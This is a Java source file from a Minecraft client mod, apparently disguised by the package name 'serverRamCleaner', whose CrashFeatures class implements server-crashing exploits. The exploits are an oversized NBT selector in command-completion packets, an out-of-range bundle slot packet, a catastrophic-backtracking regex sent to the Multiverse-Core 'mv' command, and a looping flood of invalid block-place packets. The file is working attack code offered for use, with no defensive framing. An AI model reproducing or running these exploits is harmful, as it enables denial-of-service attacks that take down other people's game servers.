package aspw.serverramcleaner.serverRamCleaner.client;

import net.minecraft.client.MinecraftClient;
import net.minecraft.item.BundleItem;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.BundleItemSelectedC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.awt.*;

public class CrashFeatures {

    public static boolean executeCompletionCrash() {
        int length = 2032;
        int packetAmount = 6;

        String overflow = JsonGenerator.generateJsonObject(length);
        String partialCommand = "msg @a[nbt=" + overflow + "]";

        Packet<?> packet = new RequestCommandCompletionsC2SPacket(0, partialCommand);

        if (MinecraftClient.getInstance().getNetworkHandler() == null) return false;

        for (int i = 0; i < packetAmount; i++) {
            MinecraftClient.getInstance().getNetworkHandler().sendPacket(packet);
        }

        return true;
    }

    public static Boolean executeBundleCrash() {
        if (MinecraftClient.getInstance().player == null || MinecraftClient.getInstance().interactionManager == null) return false;

        ItemStack heldItem = MinecraftClient.getInstance().player.getInventory().getSelectedStack();

        if (!(heldItem.getItem() instanceof BundleItem)) {
            ServerRamCleanerMod.printChat("Must have a bundle that contains one item", Color.WHITE);
            return null;
        }

        int slotIdx = 36;
        int selected = -1337;

        Packet<?> packet = new BundleItemSelectedC2SPacket(slotIdx, selected);

        if (MinecraftClient.getInstance().getNetworkHandler() == null) return false;
        MinecraftClient.getInstance().getNetworkHandler().sendPacket(packet);

        MinecraftClient.getInstance().interactionManager.interactItem(MinecraftClient.getInstance().player, Hand.MAIN_HAND);

        return true;
    }

    public static boolean executeMultiverseCoreCrash() {
        if (MinecraftClient.getInstance().player == null) return false;

        MinecraftClient.getInstance().player.networkHandler.sendChatCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");

        return true;
    }

    public static void executePlaceLogPacket(int amount, int delay) {
        if (MinecraftClient.getInstance().player == null || MinecraftClient.getInstance().getNetworkHandler() == null) return;

        new Thread(() -> {
            try {
                for (int i = 0; i < amount; i++) {
                    MinecraftClient.getInstance().getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, BlockHitResult.createMissed(new Vec3d(-1000, 1000, -1000), Direction.DOWN, MinecraftClient.getInstance().player.getBlockPos()), 1));
                    MinecraftClient.getInstance().getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, BlockHitResult.createMissed(new Vec3d(1000, -1000, 1000), Direction.DOWN, MinecraftClient.getInstance().player.getBlockPos()), 1));
                    MinecraftClient.getInstance().getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, BlockHitResult.createMissed(new Vec3d(1000, 1000, -1000), Direction.DOWN, MinecraftClient.getInstance().player.getBlockPos()), 1));
                    ServerRamCleanerMod.printChat("Sent place packets", Color.RED);
                    Thread.sleep(delay * 100L);
                }
            } catch (InterruptedException ignored) {
            }
        }).start();
    }
}
